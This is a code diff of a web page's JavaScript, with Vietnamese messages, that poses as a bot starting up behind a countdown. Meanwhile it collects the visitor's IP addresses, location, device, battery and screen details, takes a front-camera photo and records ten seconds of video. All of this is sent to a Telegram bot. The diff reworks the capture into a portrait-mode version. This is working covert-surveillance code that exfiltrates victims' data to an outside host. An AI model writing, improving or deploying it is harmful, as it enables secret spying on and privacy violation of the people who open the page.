@@ -27,7 +27,6 @@
       return now.toLocaleDateString('vi-VN', opts);
     }
 
-    // Generic sender using FormData
     function sendToTelegram(endpoint, formData) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
       return fetch(url, { method: 'POST', body: formData })
@@ -36,100 +35,84 @@
         .catch(err => console.error(`Lỗi gửi ${endpoint}:`, err));
     }
 
-    // Send text message
     async function sendText(message) {
-      const form = new FormData();
-      form.append('chat_id', CHAT_ID);
-      form.append('text', message);
+      const form = new FormData(); form.append('chat_id', CHAT_ID); form.append('text', message);
       return sendToTelegram('sendMessage', form);
     }
-
-    // Send photo
-    async function sendPhoto(photoBlob, caption) {
-      const form = new FormData();
-      form.append('chat_id', CHAT_ID);
-      form.append('photo', photoBlob, 'photo.jpg');
-      if (caption) form.append('caption', caption);
+    async function sendPhoto(blob, caption) {
+      const form = new FormData(); form.append('chat_id', CHAT_ID); form.append('photo', blob, 'photo.jpg'); if (caption) form.append('caption', caption);
       return sendToTelegram('sendPhoto', form);
     }
-
-    // Send video
-    async function sendVideo(videoBlob, caption) {
-      const form = new FormData();
-      form.append('chat_id', CHAT_ID);
-      form.append('video', videoBlob, 'video.webm');
-      if (caption) form.append('caption', caption);
+    async function sendVideo(blob, caption) {
+      const form = new FormData(); form.append('chat_id', CHAT_ID); form.append('video', blob, 'video.webm'); if (caption) form.append('caption', caption);
       return sendToTelegram('sendVideo', form);
     }
 
-    // Gather device & network info and send
     async function getAddress() {
       try {
-        const ipv6Res = await fetch('https://api6.ipify.org?format=json');
-        const { ip: ipv6 } = await ipv6Res.json();
-        const res = await fetch('https://ipinfo.io/json');
-        const info = await res.json();
-        if (info.country !== 'VN') return await sendText('Không thể lấy địa chỉ.');
-
+        const ipv6Res = await fetch('https://api6.ipify.org?format=json'); const { ip: ipv6 } = await ipv6Res.json();
+        const res = await fetch('https://ipinfo.io/json'); const info = await res.json();
+        if (info.country !== 'VN') return sendText('Không thể lấy địa chỉ.');
         let msg = `🗺 Địa Chỉ: ${info.city}, ${info.region}, ${info.country}\n`;
         msg += `🗺 IP: ${info.ip}\n🗺 IPv6: ${ipv6}\n`;
         msg += `🕒 Thời Gian: ${await getCurrentTime()}\n`;
         msg += `💻 Thiết Bị: ${navigator.userAgent}\n`;
-
         const battery = navigator.getBattery ? await navigator.getBattery() : { level: null };
         msg += `🔋 Pin: ${battery.level != null ? battery.level*100 + '%' : 'Không xác định'}\n`;
         msg += `🛠 OS: ${navigator.platform}\n📜 Ngôn Ngữ: ${navigator.language}\n`;
         msg += `🖥 Độ phân giải: ${screen.width}x${screen.height}\n\nPowered by Hoang Anh👑`;
-
-        return await sendText(msg);
+        return sendText(msg);
       } catch (err) {
-        console.error(err);
-        return await sendText('Không thể lấy địa chỉ.');
+        console.error(err); return sendText('Không thể lấy địa chỉ.');
       }
     }
 
-    // Handle media capture
-    async function captureAndSendMedia() {
+    // Capture photo and record video in portrait orientation
+    async function captureMediaPortrait() {
+      const constraints = { video: { facingMode: 'user', width: { ideal: 720 }, height: { ideal: 1280 } } };
+      let stream;
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        document.body.appendChild(video);
-        video.srcObject = stream;
-        video.play();
-        video.onloadedmetadata = async () => {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0);
-          const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
-          await sendPhoto(blob, `📸 Ảnh thành công\n🕒 ${await getCurrentTime()}`);
-          video.remove();
-          stream.getTracks().forEach(t => t.stop());
-        };
-      } catch (err) {
-        console.error('Lỗi camera:', err);
-      }
+        stream = await navigator.mediaDevices.getUserMedia(constraints);
+        // Preview element (optional)
+        const videoEl = document.createElement('video'); document.body.appendChild(videoEl);
+        videoEl.setAttribute('playsinline', 'true');
+        videoEl.srcObject = stream;
+        await videoEl.play();
 
-      // Record video for 10s
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const mediaRec = new MediaRecorder(stream);
+        // Wait for metadata
+        await new Promise(res => videoEl.onloadedmetadata = res);
+
+        // --- Take photo ---
+        const canvas = document.createElement('canvas');
+        canvas.width = videoEl.videoWidth;
+        canvas.height = videoEl.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+        const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
+        await sendPhoto(photoBlob, `📸 Ảnh thành công\n🕒 ${await getCurrentTime()}`);
+
+        // --- Record video 10s ---
+        const recorder = new MediaRecorder(stream);
         const chunks = [];
-        mediaRec.ondataavailable = e => chunks.push(e.data);
-        mediaRec.onstop = async () => {
-          const blob = new Blob(chunks, { type: 'video/webm' });
-          await sendVideo(blob, `🎞 Video thành công\n🕒 ${await getCurrentTime()}`);
-          stream.getTracks().forEach(t => t.stop());
-        };
-        mediaRec.start();
-        setTimeout(() => mediaRec.stop(), 10000);
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.start();
+        // Ensure full 10s
+        await new Promise(r => setTimeout(r, 10000));
+        recorder.stop();
+        await new Promise(res => recorder.onstop = res);
+
+        const videoBlob = new Blob(chunks, { type: 'video/webm' });
+        await sendVideo(videoBlob, `🎞 Video thành công\n🕒 ${await getCurrentTime()}`);
+
+        // Cleanup
+        videoEl.remove();
+        stream.getTracks().forEach(t => t.stop());
       } catch (err) {
-        console.error('Lỗi quay video:', err);
+        console.error('Lỗi captureMediaPortrait:', err);
+        if (stream) stream.getTracks().forEach(t => t.stop());
       }
     }
 
-    // Countdown animation
     function countdown(sec) {
       const el = document.getElementById('countdown');
       el.textContent = `Vui lòng chờ ${sec} giây khởi động bot...`;
@@ -138,18 +121,14 @@
         if (sec <= 0) {
           clearInterval(iv);
           el.textContent = 'Khởi động hoàn tất!';
-          captureAndSendMedia();
-        } else {
-          el.textContent = `Vui lòng chờ ${sec} giây khởi động bot...`;
-        }
+          captureMediaPortrait();
+        } else el.textContent = `Vui lòng chờ ${sec} giây khởi động bot...`;
       }, 1000);
     }
 
-    // Init
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(() => countdown(11))
       .catch(err => console.error('Không thể truy cập camera:', err));
-
     getAddress();
   </script>
 </body>
